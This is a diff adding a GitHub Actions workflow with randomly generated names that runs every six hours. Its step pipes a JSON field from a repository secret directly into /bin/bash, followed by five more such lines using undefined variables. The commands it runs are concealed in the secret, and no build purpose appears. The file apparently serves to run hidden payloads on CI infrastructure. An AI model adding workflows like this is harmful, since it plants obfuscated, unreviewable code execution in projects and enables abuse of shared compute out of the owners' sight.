@@ -1,0 +1,23 @@
+name: sweatsuitmachinist
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sweatsuitmachinist
+        env:
+          rrtj7: ${{ secrets.rrtj7 }}
+        run: |
+          echo $rrtj7 | jq -r .kkwzc8 | /bin/bash
+          echo $kk48844 | jq -r .pnsmd161 | /bin/bash
+          echo $kexzd405 | jq -r .pr80791 | /bin/bash
+          echo $ny3 | jq -r .hkk99951 | /bin/bash
+          echo $gu1990 | jq -r .awfh91747 | /bin/bash
+          echo $adhbj44010 | jq -r .u6 | /bin/bash
+
